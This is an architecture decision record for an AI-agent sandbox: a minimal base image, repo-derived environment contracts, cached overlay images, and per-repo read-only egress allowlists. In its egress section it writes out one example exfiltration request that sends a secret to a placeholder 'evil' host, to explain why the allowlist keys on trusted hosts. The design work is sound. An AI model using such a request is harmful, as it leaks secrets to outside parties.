# ADR 0009 - Minimal sandbox base + on-demand, layered, cached provisioning

- Status: **Accepted**
- Date: 2026-06-24
- Decision owner: `<user>`

## Context

Driving a single TypeScript monorepo to completion in the OpenShell sandbox took
five separate runtime failures to discover what the repo actually needed: npm
registry egress, a Node-18-incompatible pnpm, a login-shell PATH reset shadowing
the pinned toolchain, a native dependency (`@vscode/sqlite3`) needing a C/C++
toolchain + Node headers from `nodejs.org`, and finally a **stale base image**
(Node 18 / no gcc) that predated its own Containerfile. Each surfaced only at
install/build time, one reactive run at a time.

The naive fix — "add whatever the last repo needed to the base image" — does not
scale and is actively harmful:

- It grows the base monotonically into a kitchen sink containing every toolchain,
  SDK, and `-dev` library any repo has ever used.
- Every sandbox then carries that entire surface whether or not the task needs
  it, **maximizing attack surface** for the common case (an agent running
  `--yolo` inside it) instead of minimizing it.
- The base becomes a hand-maintained bottleneck: a new project's needs require a
  human to edit and rebuild the fleet base.

The repository contract (`.mac/project.yaml`, see
`docs/repository-runtime-contract.md`) already records *which commands exist*
(`toolchain.required_commands`) but not the *environment graph* those commands
imply (version floors, native-build prerequisites, system libraries, egress
hosts). So the provisioner sees "node present, pnpm present" and proceeds; the
real requirements explode later. ADR 0008 already noted that runtime/image drift
produces "an image that was stale or unusable" — the same failure class.

## Decision

**The base image is a minimal, audited attack surface. Everything a specific
repo needs beyond that floor is derived from the repo, provisioned on demand,
routed to the cheapest layer that can satisfy it, and cached — never accumulated
into the base.**

### 1. Minimal base (rarely changes; deliberately small)

The base `mac-hermes` image contains only:

- a minimal OS + `ca-certificates`, `git`, `curl`, the egress proxy's `ip`
  helper, and the `sandbox` user OpenShell requires;
- the **bootstrap package managers** used to fetch everything else on demand:
  the OS package tool (apt), `pip`, and a Node package manager (`npm`/`pnpm`),
  plus a single bootstrap language runtime (Python) the MAC runtime itself needs.

The base does **not** aim to contain every compiler, SDK, language runtime, or
`-dev` library. Adding anything to the base is a deliberate, reviewed exception
justified by being needed by a large fraction of repos AND impossible to
provision on demand — not "the last repo needed it." Each base addition is an
attack-surface decision, recorded as such.

### 2. Environment contract (static, at onboarding)

Onboarding derives an **environment contract** by static analysis of the repo
(alongside, not inside, the codegraph index — codegraph indexes source symbols,
not build/dep manifests):

- `runtime_floors` — `node_min`/`python_min`/etc. from `engines`,
  `packageManager`, `.nvmrc`, `.node-version`, `go.mod`, lockfiles.
- `native_build` — true when any `binding.gyp`, a `node-gyp`/`*-rebuild` install
  script, pnpm `onlyBuiltDependencies`, or a known-native package
  (`@vscode/sqlite3`, `better-sqlite3`, `bcrypt`, `sharp` without a prebuilt,
  `node-sass`, …) is present; likewise `Cargo.toml`/`CMakeLists.txt` for other
  languages.
- `system_libs` — `-dev` packages implied by native deps (e.g. `libssl-dev`,
  `libpq-dev`, `libvips-dev`).
- `egress_hosts` — registries from lockfile resolution URLs + `.npmrc`, plus
  `nodejs.org` when `native_build`, **plus the repo's declared runtime/integration
  API hosts** (see §2a).

### 2a. Egress is a declared, read-only-scoped contract dimension — not a wall

Deny-by-default egress is the correct *default* for an unknown repo running a
`--yolo` agent, but it must not be a fixed wall: a real application legitimately
reads from external APIs, and the allowlist is part of the repo's environment
contract exactly as package registries are. A repo declares the hosts it reads,
scoped and audited:

```
egress:
  - host: opensky-network.org   access: read-only   # ADS-B state vectors
  - host: aviationweather.gov   access: read-only   # SIGMET/AIRMET
  - host: tfr.faa.gov           access: read-only   # TFRs
```

Principles:

- **Host-allowlisting is the axis, not GET-vs-POST.** `GET https://evil/?x=<secret>`
  is exfiltration with a GET; a `GET` is only safe if the *host* is trusted. The
  policy keys on host + method + `read-only`, so a repo can be granted read-only
  GET to exactly its declared hosts and nothing else.
- **Derived/declared per-repo, not global.** The hosts come from the repo's
  contract (and, where inferable, its source — API base URLs / SDK clients), and
  are rendered into that repo's sandbox policy. The unknown repo still gets deny-
  all; the known repo gets exactly what it declares.
- **Three postures for three activities** (do not conflate them):
  1. *Agent writes code + unit tests* → deny-by-default; unit tests are
     **hermetic** (mock external HTTP, drive from committed fixtures). This is good
     engineering everywhere, not a sandbox crutch — CI must not flake on a third-
     party API's rate limit or downtime.
  2. *Integration test against a live API* → an **opt-in tier** that runs with the
     repo's declared read-only egress; never the default gate.
  3. *The app fetching live data in production* → runs **outside** the sandbox in
     its real deployment with its own network policy. The sandbox is a build/test/
     agent-dev environment, not the production runtime.

A repo whose legitimate external dependencies are blocked by the same wall as a
malicious exfiltration attempt is a *mis-declared* contract, not a sandbox
limitation — the fix is to declare the egress, read-only, per repo.

### 3. Provisioning router — cheapest layer that satisfies each requirement

The environment contract is **routed**, not dumped into the base:

| Requirement kind | Layer | Mutates base? | Root? |
|---|---|---|---|
| Satisfied by the base floor | run as-is | no | n/a |
| Project packages (`node_modules`, venvs, crates) | project bootstrap over egress | no | no |
| Long-tail CLI tool / pinned runtime not in base | task-local toolchain (`.mac-toolchain`, rootless, over egress) | no | no |
| Root-level system dep (compiler, `-dev` lib) | **on-demand overlay image** | no (separate layer) | at build time only |
| Network reachability | repo-derived egress policy | no | no |

The generality comes from **letting the repo fetch its own dependencies over a
repo-scoped egress policy**, not from baking them in.

### 4. On-demand overlay cache (how root-level deps scale without base growth)

Root-requiring system deps (compilers, `-dev` libraries) that can't be made
task-local are provisioned by building a thin **overlay image**
(`FROM mac-hermes-base; apt-get install <derived system_libs + toolchain>`):

- **Content-addressed**: the cache key is the digest of the sorted
  `system_libs`/toolchain set (+ the base digest). The first repo needing
  `build-essential + libsqlite-headers` builds it once; every later repo with the
  same set reuses it; a Rust repo builds a different overlay. The base is never
  touched.
- **Lazy + shared + evictable**: overlays are built on first need, shared across
  tasks/repos with identical requirements, and LRU-garbage-collected. Growth
  happens in an automatic, content-addressed, evictable cache — not in a
  hand-maintained base that only grows.
- **Pre-warming is allowed but is not base growth**: common overlays (e.g.
  "node-native") may be pre-built so the cache is warm, but sandboxes that don't
  need them never load them, so the default attack surface stays minimal.

### 5. Pre-flight + fail-fast

Before the first task run, validate the resolved image (base or overlay)
satisfies the environment contract — `node_min`, compiler-present-when-
`native_build` — and that the egress policy covers `egress_hosts`. On a gap, emit
one actionable message (`repo requires Node>=22 + C toolchain + nodejs.org;
selected image has Node 18/no gcc — building overlay <hash> / rejecting`) instead
of a multi-run reactive grind. This also catches a **stale image** immediately
(image runtime version < `runtime_floors`).

## Consequences

- **Minimal attack surface by default.** A repo that needs no compiler runs in a
  sandbox with no compiler. Surface is added per-task, only for what the
  environment contract proves is needed, and only for that task's overlay.
- **The base stops accumulating.** Scaling to new project types happens in the
  content-addressed overlay cache and the egress policy, not by editing the base.
  Base changes become rare, reviewed attack-surface decisions.
- **No human in the loop for ordinary repos.** Version floors, packages, and
  long-tail tools are derived and provisioned automatically; only a genuinely
  novel root-level system lib (no overlay yet, not pre-warmed) incurs a one-time
  cached build.
- **Cost shifts to first-use, then amortized.** The first repo of a new
  environment class pays an overlay build; subsequent ones hit the cache.
- **Depends on the environment contract** (the detection from the
  proactive-environment-scan work) to drive routing. Detection without routing
  just fails faster; routing without a minimal base just relocates the bloat.
  Both are required, and this ADR is the routing/packaging half.
- **Interaction with ADR 0008**: overlays are built and run through the same
  single container runtime; the cache lives in that runtime's image store.
